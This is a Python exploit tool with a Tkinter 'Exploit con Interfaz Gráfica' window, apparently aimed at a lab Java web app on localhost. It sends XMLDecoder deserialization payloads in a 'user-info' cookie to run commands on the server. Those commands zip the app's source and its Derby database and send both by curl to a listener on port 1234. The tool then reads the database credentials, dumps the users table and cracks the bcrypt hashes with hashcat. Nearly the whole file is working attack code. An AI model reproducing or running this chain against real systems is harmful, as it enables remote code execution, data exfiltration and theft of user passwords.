import sys
import time
from tkinter import Label, Text, filedialog
import requests
import base64
import jaydebeapi
import jpype
import os
import tkinter as tk
from tkinter import messagebox, Toplevel, ttk
import threading
import subprocess
import zipfile
import base64
import xml.etree.ElementTree as ET
from PIL import Image, ImageTk
import requests

def obtenerUserInfo():
    # URL de inicio de sesión
    url_login = "http://localhost:8888/login"

    # Datos del formulario de inicio de sesión
    payload = {
        "email": "atacante@gmail.com",
        "password": "atacante",
        "rememberMe": "true",
        "_rememberMe": "on"
    }

    # Headers adicionales (puedes personalizarlos si es necesario)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "Accept-Language": "es-ES,es;q=0.9",
        "Origin": "http://localhost:8888",
        "Referer": "http://localhost:8888/login"
    }

    # Crear una sesión para mantener las cookies entre las solicitudes
    session = requests.Session()

    # Realizar la solicitud POST para iniciar sesión
    response = session.post(url_login, headers=headers, data=payload)
    userInfo = ""
    # Verificar si la cookie de sesión JSESSIONID se ha almacenado correctamente
    if 'user-info' in session.cookies:
        print(f"user-info recibido: {session.cookies['user-info']}")
        userInfo = session.cookies['user-info']

    else:
        print("No se ha recibido user-info. Revisa el inicio de sesión.")

    return userInfo



def sacarHash(user_info_base64):
    decoded_user_info = base64.b64decode(user_info_base64)
    #print(decoded_user_info,"\n")
    
    # Parsear el XML decodificado
    root = ET.fromstring(decoded_user_info.decode("utf-8"))

    # Extraer la contraseña hasheada del XML
    password_hash = root.find(".//void[@property='password']/string").text
    #print("Password hash completo:", password_hash)

    # Dividir el hash en sus partes
    partes = password_hash.split('$')
    bcrypt_id = partes[1]
    log_rounds = partes[2]
    salt = partes[3][:22]  # 22 caracteres para el salt
    hash_resultante = partes[3][22:]  # los caracteres restantes para el hash

    print("Versión del algoritmo:", bcrypt_id)
    print("Factor de trabajo:", log_rounds)
    print("Salt:", salt)
    print("Hash:", hash_resultante)

    return ("$" + bcrypt_id +"$" + log_rounds + "$" + salt), hash_resultante


def obtencionSource():
    URL: str = "http://localhost:8888/"
    current_dir = os.getcwd()
    print(current_dir)

    PAYLOAD2: str = f"""
    <?xml version="1.0" encoding="UTF-8"?>
    <java version="21.0.4" class="java.beans.XMLDecoder">
    <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
    <array class="java.lang.String" length="3">
        <void index="0">
        <string>cmd</string> <!-- Usamos cmd.exe en lugar de bash -->
        </void>
        <void index="1">
        <string>/c</string> <!-- Ejecutar en cmd.exe -->
        </void>
        <void index="2">
        <string>powershell Compress-Archive -Path src -DestinationPath codigoFuente.zip</string> <!-- Usamos PowerShell para comprimir -->
        </void>
    </array>
    </void>
    </object>
    </java>
    """




    ##### COMPRIMO EL SRC ######
    PAYLOAD2 = PAYLOAD2.strip()


    # Codificar el payload a base64
    encoded_payload = base64.b64encode(PAYLOAD2.encode()).decode()


    # Se envía la solicitud
    response = requests.get(URL, cookies={
        'user-info': encoded_payload
    })

    PAYLOAD3: str = f"""
    <?xml version="1.0" encoding="UTF-8"?>
    <java version="21.0.4" class="java.beans.XMLDecoder">
    <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
    <array class="java.lang.String" length="3">
        <void index="0">
        <string>cmd</string> <!-- Usamos cmd.exe -->
        </void>
        <void index="1">
        <string>/c</string> <!-- Ejecutar en cmd.exe -->
        </void>
        <void index="2">
        <string>curl -X POST http://localhost:1234/source -F "file=@codigoFuente.zip"</string> <!-- Usamos curl para enviar el archivo -->
        </void>
    </array>
    </void>
    </object>
    </java>
    """
    PAYLOAD3 = PAYLOAD3.strip()


    encoded_payload = base64.b64encode(PAYLOAD3.encode()).decode()
    
    response = requests.get(URL, cookies={
        'user-info': encoded_payload
    })

    time.sleep(2)
    with zipfile.ZipFile('codigoFuente.zip', 'r') as zip_ref:
        zip_ref.extractall("")
    
    properties_file_path = 'src/main/resources/application.properties'

    # Leer el archivo application.properties
    with open(properties_file_path, 'r') as file:
        properties = file.readlines()

    # Buscar la línea que contiene la URL de la base de datos
    # Inicializar variables para la URL, usuario y contraseña
    db_url = ''
    db_username = ''
    db_password = ''

    # Buscar las líneas que contienen las configuraciones
    for line in properties:
        # Eliminar espacios en blanco y saltos de línea
        line = line.strip()

        # Buscar la URL de la base de datos
        if line.startswith("spring.datasource.url="):
            db_url = line.split('=')[1]

        # Buscar el nombre de usuario
        elif line.startswith("spring.datasource.username="):
            db_username = line.split('=')[1]

        # Buscar la contraseña
        elif line.startswith("spring.datasource.password="):
            db_password = line.split('=')[1]

    # Imprimir los valores obtenidos
    #print(f"Database URL: {db_url}")
    #print(f"Username: {db_username}")
    #print(f"Password: {db_password}")

    db_folder = db_url.replace("jdbc:derby:","")
    work_folder = db_folder.replace("/database","")

    PAYLOAD4 = f"""
    <?xml version="1.0" encoding="UTF-8"?>
<java version="21.0.4" class="java.beans.XMLDecoder">
    <object class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
            <array class="java.lang.String" length="3">
                <void index="0">
                    <string>cmd</string>
                </void>
                <void index="1">
                    <string>/c</string>
                </void>
                <void index="2">
                    <string>powershell -Command "Copy-Item -Path {work_folder} -Destination 'work_copy' -Recurse; Compress-Archive -Path 'work_copy' -DestinationPath 'data.zip'"</string>
                </void>
            </array>
        </void>
    </object>
</java>


    """



    ##### COMPRIMO EL SRC ######
    PAYLOAD4 = PAYLOAD4.strip()


    # Codificar el payload a base64
    encoded_payload = base64.b64encode(PAYLOAD4.encode()).decode()


    # Se envía la solicitud
    response = requests.get(URL, cookies={
        'user-info': encoded_payload
    })

    time.sleep(4)

    PAYLOAD5: str = f"""
    <?xml version="1.0" encoding="UTF-8"?>
    <java version="21.0.4" class="java.beans.XMLDecoder">
    <object class="java.lang.Runtime" method="getRuntime">
    <void method="exec">
    <array class="java.lang.String" length="3">
        <void index="0">
        <string>cmd</string> <!-- Usamos cmd.exe -->
        </void>
        <void index="1">
        <string>/c</string> <!-- Ejecutar en cmd.exe -->
        </void>
        <void index="2">
        <string>curl -X POST http://localhost:1234/sourceDB -F "file=@data.zip"</string> <!-- Usamos curl para enviar el archivo -->
        </void>
    </array>
    </void>
    </object>
    </java>
    """
    PAYLOAD5 = PAYLOAD5.strip()


    encoded_payload = base64.b64encode(PAYLOAD5.encode()).decode()
    
    response = requests.get(URL, cookies={
        'user-info': encoded_payload
    })

    time.sleep(1)
    with zipfile.ZipFile('data.zip', 'r') as zip_ref:
        zip_ref.extractall("")
    #Estado del response
    # Renombrar la carpeta 'work_copy' a 'work'
    if not os.path.exists('work'):
        if os.path.exists('work_copy'):
            os.rename('work_copy', 'work')
        else:
            print("La carpeta 'work_copy' no existe.")


    # Inicia la JVM si no está en ejecución
    if jpype.isJVMStarted():
        jpype.shutdownJVM()

    # Obtener la ruta actual donde está el script y el archivo .jar
    current_dir = os.path.dirname(os.path.abspath(__file__))
    jdbc_driver_path = os.path.join(current_dir, "lib", "derbytools.jar")  # Asumiendo que 'lib' está en el mismo directorio
    #print(jdbc_driver_path)
    # Inicia la JVM con el archivo .jar en el classpath
    jpype.startJVM(classpath=[jdbc_driver_path])

    # Detalles de conexión
    jdbc_url = db_url  # Asegúrate de que esta sea una URL válida
    #print(jdbc_url)
    username = db_username
    password = db_password
    driver_class = "org.apache.derby.jdbc.EmbeddedDriver"  # Use EmbeddedDataSource class

    # Conexión a la base de datos Derby
    conn = jaydebeapi.connect(
        driver_class,   # Clase del controlador JDBC
        jdbc_url,       # URL de conexión a la base de datos
        [username, password],  # Credenciales
        jdbc_driver_path  # Ruta al archivo .jar con el controlador JDBC
    )

    # Ejecutar una consulta
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users")  # Cambia el nombre de la tabla según tu esquema
    rows = cursor.fetchall()
    datosUsuarios = []

    # Mostrar los resultados
    for row in rows:
        datosUsuarios.append(row)
        print(row)

    # Cerrar la conexión
    cursor.close()
    conn.close()
    # Apagar la JVM
    #jpype.shutdownJVM()

    return datosUsuarios

def cargar_diccionario():
    """
    Abre un cuadro de diálogo para seleccionar un archivo de diccionario
    y lo carga en la función de Hashcat.
    """
    global diccionario_path
    # Abrir un cuadro de diálogo de selección de archivo
    diccionario_path = filedialog.askopenfilename(title="Seleccionar archivo diccionario", filetypes=(("Archivos de texto", "*.txt"), ("Todos los archivos", "*.*")))

    if diccionario_path:
        print(f"Archivo de diccionario cargado: {diccionario_path}")
        messagebox.showinfo("Diccionario Cargado", f"Archivo de diccionario cargado con éxito: {diccionario_path}")
    else:
        messagebox.showerror("Error", "No se seleccionó ningún archivo diccionario.")


from tkinter import messagebox, Toplevel, ttk

import subprocess

def obtenerPasswordUsuarios(datosUsuarios, salt, dictHashes):
    # Extraer los pares de email y contraseña
    email_password_pairs = [(entry[6], entry[9]) for entry in datosUsuarios]

    # Escribir hashes en fichero
    # Write hashes to file
    email_file_path = "emailwithpass.txt"
    with open(email_file_path, 'w') as email_file:
        for email, password in email_password_pairs:
            # Ensure email is a string and write to file
            email_file.write(str(email)+ "," + str(password) + '\n')


    # Escribir hashes en fichero
    hashes_file_path = "hashes.txt"
    with open(hashes_file_path, 'w') as hashes_file:
        for _, password_hash in email_password_pairs:
            # Separar el salt y el hash
            hashWithoutSalt = password_hash.replace(salt,"")
            
            # Aquí podemos crear un formato que Hashcat entienda. Para bcrypt, usamos:
            # <salt>$<hash_sin_salt> para el formato correcto.
            hashcat_format = f"{salt}{hashWithoutSalt}\n"
            hashes_file.write(hashcat_format)

    current_directory = os.getcwd().replace("\\", "/")  # Cambia barras invertidas por barras normales

    # Ruta donde está instalado Hashcat (cambia esto por la ruta real)
    hashcat_directory = f"{current_directory}/hashcat"  

    # Archivos en la carpeta donde se ejecuta el código
    found_passwords_file = f"{current_directory}/clavesDescifradas.txt"
    hashes_file_path = f"{current_directory}/hashes.txt"

    with open(found_passwords_file, 'w'):
        pass
            
    # Configuración del comando hashcat
    hashcat_command = [
        "hashcat", 
        "-d", "1,3",
        "-m", "3200", 
        "-a", "0", 
        "-w", "3",  
        "-o", found_passwords_file,  
        hashes_file_path, 
        dictHashes,
        "--potfile-disable"
    ]

    try:
        # Cambiar el directorio a la carpeta donde está instalado Hashcat
        os.chdir(hashcat_directory)

        # Ejecutar Hashcat
        print("Ejecutando Hashcat...")
        result = subprocess.run(hashcat_command, capture_output=True, text=True)

       
        print(f"Hashcat éxito: {result.stdout}")

        # Leer las contraseñas encontradas
        if os.path.exists(found_passwords_file):
            with open(found_passwords_file, 'r') as f:
                found_passwords = f.readlines()
            
            if not found_passwords:
                print("No se encontraron contraseñas. Revisa si el diccionario contiene contraseñas válidas para los hashes dados.")
                return

            # Preparar los datos para la tabla
            passwords_list = []
            for line in found_passwords:
                # Cada línea tiene el hash y la contraseña encontrada
                hash, password = line.split(":")
                passwords_list.append((hash.strip(), password.strip()))
            
            return passwords_list
        else:
            print("El archivo de contraseñas descifradas no se generó.")

    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar Hashcat: {e}")
        return passwords_list
    except Exception as e:
        print(f"Error inesperado: {str(e)}")
        return passwords_list

# Función para leer los emails y contraseñas desde el archivo emailwithhashes.txt
def obtenerEmailsYContraseñas():
    email_password_pairs = []
    current_directory = os.getcwd().replace("\\", "/")  # Cambia barras invertidas por barras normales
    email_file_path = f"{current_directory}/emailwithpass.txt"  # Ruta del archivo

    with open(email_file_path, "r") as file:
        for line in file.readlines():
            # Suponiendo que los datos están separados por un espacio, ajusta según el delimitador
            parts = line.strip().split(",")
            if len(parts) == 2:  # Asegúrate de que hay solo 2 partes (email y contraseña)
                email_password_pairs.append((parts[0], parts[1]))

    return email_password_pairs

# Función para mostrar la tabla en un popup
def mostrarResultadosTabla(passwords_list):
    # Crear una nueva ventana de popup
    popup = Toplevel()
    popup.title("Contraseñas Descifradas")
    popup.geometry("600x400")

    # Cambiar el directorio si es necesario
    os.chdir("..")

    # Cargar la imagen GIF
    gif_path = "matrix.gif"  # Ruta a tu archivo GIF
    gif_image = Image.open(gif_path)

    # Crear un label para mostrar el fondo GIF
    label_fondo = tk.Label(popup)
    label_fondo.place(relwidth=1, relheight=1)  # Hacer que ocupe todo el popup

    # Mantener la referencia a la imagen GIF para evitar que se borre
    def update_gif_frame():
        try:
            # Avanzar a la siguiente imagen del GIF
            gif_image.seek(gif_image.tell() + 1)
        except EOFError:
            gif_image.seek(0)  # Reiniciar al primer fotograma si llegamos al final

        gif_photo = ImageTk.PhotoImage(gif_image)
        label_fondo.config(image=gif_photo)
        label_fondo.image = gif_photo  # Mantener la referencia para que no se borre

        # Actualizar la imagen cada 50ms
        label_fondo.after(50, update_gif_frame)

    # Iniciar la animación del GIF
    update_gif_frame()

    # Obtener los emails y contraseñas
    email_password_pairs = obtenerEmailsYContraseñas()

    # Crear un Treeview para mostrar los resultados
    tree = ttk.Treeview(popup, columns=("Email", "Hash", "Contraseña"), show="headings")
    tree.heading("Email", text="Email")
    tree.heading("Hash", text="Hash")
    tree.heading("Contraseña", text="Contraseña")

    # Establecer el ancho de las columnas
    tree.column("Email", width=150)
    tree.column("Hash", width=150)
    tree.column("Contraseña", width=150)

    # Mostrar los resultados con el email correspondiente a cada hash
    for index, (email, password) in enumerate(email_password_pairs):
        for (found_hash, password_descifrada) in passwords_list:
            if found_hash.strip() == password.strip():
                # Usar un tag para alternar las filas de la tabla (opcional, para alternar colores)
                row_tag = 'evenrow' if index % 2 == 0 else 'oddrow'
                tree.insert("", "end", values=(email, found_hash, password_descifrada), tags=(row_tag,))

    # Colocar la tabla en el popup
    tree.pack(expand=True, fill="both", padx=10, pady=10)

    # Mostrar el número de contraseñas descifradas
    num_descifradas = len(passwords_list)
    label_info = tk.Label(popup, text=f"Contraseñas descifradas: {num_descifradas}", font=("Arial", 12), fg="green", bg="black")
    label_info.pack(pady=10)

    # Botón para cerrar la ventana del popup
    btn_cerrar = tk.Button(popup, text="Cerrar", command=popup.destroy, font=("Arial", 12), fg="green", bg="black")
    btn_cerrar.pack(pady=10)

    # Ejecutar el bucle principal del popup
    popup.mainloop()

# Función para ejecutar el exploit en un hilo separado
def ejecutar_exploit():
    # Desactivar el botón de ejecución mientras se procesa
    btn_iniciar.config(state=tk.DISABLED)
    status_label.config(text="Iniciando sesión...")

    try:
        user_info = obtenerUserInfo()  # Obtener user-info
        if user_info:
            # Mostrar user-info en la GUI
            actualizar_resultados(f"user-info recibido: {user_info}")
            
            status_label.config(text="Obteniendo hash de la contraseña...")
            saltFijo, hashBasura = sacarHash(user_info)  # Obtener hash
            
            # Mostrar los detalles del hash en la GUI
            actualizar_resultados(f"Salt fijo obtenido: {saltFijo}")
            
            status_label.config(text="Obteniendo datos de los usuarios...")
            datosUsers = obtencionSource()  # Obtener los datos de los usuarios
            
            if diccionario_path:
                passList = obtenerPasswordUsuarios(datosUsers, saltFijo, diccionario_path)  # Usar diccionario para buscar contraseñas
                mostrarResultadosTabla(passList)
                status_label.config(text="Proceso completado con éxito.")
                messagebox.showinfo("Éxito", "Proceso completado correctamente")
            else:
                messagebox.showerror("Error", "Por favor, cargue un archivo diccionario.")
            
            status_label.config(text="Proceso completado con éxito.")
            messagebox.showinfo("Éxito", "Proceso completado correctamente")
        else:
            status_label.config(text="No se pudo obtener información de usuario.")
            messagebox.showerror("Error", "No se pudo iniciar sesión correctamente.")
    except Exception as e:
        status_label.config(text=f"Error: {str(e)}")
        messagebox.showerror("Error", f"Hubo un problema: {str(e)}")
    finally:
        btn_iniciar.config(state=tk.NORMAL)



# Función para cerrar la ventana y terminar el programa
def on_closing():
    if messagebox.askokcancel("Salir", "¿Seguro que deseas salir?"):
        window.destroy()
        sys.exit()  # Termina el programa completo

# Función para agregar texto al área de resultados de forma segura desde un hilo
def actualizar_resultados(texto):
    # Usamos .after() para actualizar la GUI de forma segura desde un hilo
    window.after(0, lambda: resultados_text.insert(tk.END, texto + "\n"))
"""
with zipfile.ZipFile('work.zip', 'r') as zip_ref:
    zip_ref.extractall("work")
"""
def update_background():
    try:
        # Intentar avanzar al siguiente fotograma
        gif_image.seek(gif_image.tell() + 1)  # Avanzar al siguiente fotograma
    except EOFError:
        # Si se llega al final del GIF, volver al primer fotograma
        gif_image.seek(0)

    # Redimensionar la imagen al tamaño de la ventana
    resized_image = gif_image.resize((window.winfo_width(), window.winfo_height()), Image.ANTIALIAS)
    gif_photo = ImageTk.PhotoImage(resized_image)

    # Actualizar la imagen en el label
    label_fondo.configure(image=gif_photo)
    label_fondo.image = gif_photo  # Mantener la referencia de la imagen

    # Volver a llamar a la función después de un intervalo (100 ms)
    window.after(100, update_background)

def on_resize(event):
    # Este evento no es necesario con el ajuste automático dentro de la animación,
    # pero lo dejamos por si se necesita otro tipo de acción.
    pass

if __name__ == "__main__":
    # Crear la ventana principal
    window = tk.Tk()
    window.title("Exploit con Interfaz Gráfica")
    window.geometry("600x400")

    # Cargar el fondo gif de la matriz
    gif_path = "matrix.gif"  # Ruta de tu archivo .gif
    gif_image = Image.open(gif_path)

    # Crear un label para mostrar el fondo
    label_fondo = Label(window)
    label_fondo.place(relwidth=1, relheight=1)  # Hacer que ocupe toda la ventana

    # Mantener la referencia de la imagen para evitar que se borre
    label_fondo.image = ImageTk.PhotoImage(gif_image)

    # Iniciar la actualización de fondo (animación)
    window.after(50, update_background)  # Actualiza la animación cada 100 ms

    # Título
    title_label = tk.Label(window, text="Exploit con Interfaz Gráfica", font=("Arial", 18),fg="green", bg="black")
    title_label.pack(pady=10)

    # Etiqueta de estado
    status_label = tk.Label(window, text="Esperando...", font=("Arial", 12),fg="green", bg="black")
    status_label.pack(pady=20)

    # Botón para cargar archivo diccionario
    boton_cargar = tk.Button(window, text="Cargar archivo diccionario",fg="green", command=cargar_diccionario, bg="black")
    boton_cargar.pack(pady=20)

    # Botón para iniciar el proceso
    btn_iniciar = tk.Button(window, text="Iniciar Exploit", font=("Arial", 14), fg="green", command=lambda: threading.Thread(target=ejecutar_exploit, daemon=True).start(), bg="black")
    btn_iniciar.pack(pady=10)

    # Área de texto para mostrar los resultados
    resultados_text = Text(window, height=10, width=70, font=("Courier", 12), fg="green",wrap=tk.WORD, bg="black")
    resultados_text.pack(pady=10)

    # Iniciar el bucle principal de la interfaz
    window.protocol("WM_DELETE_WINDOW", on_closing)
    window.mainloop()
    """print("Iniciando sesión y obteniendo cookie user-info...")
    user_info = obtenerUserInfo()
    saltFijo, hashBasura = sacarHash(user_info)
    datosUsers = obtencionSource()
    formatearDatosUsuarios(datosUsers)"""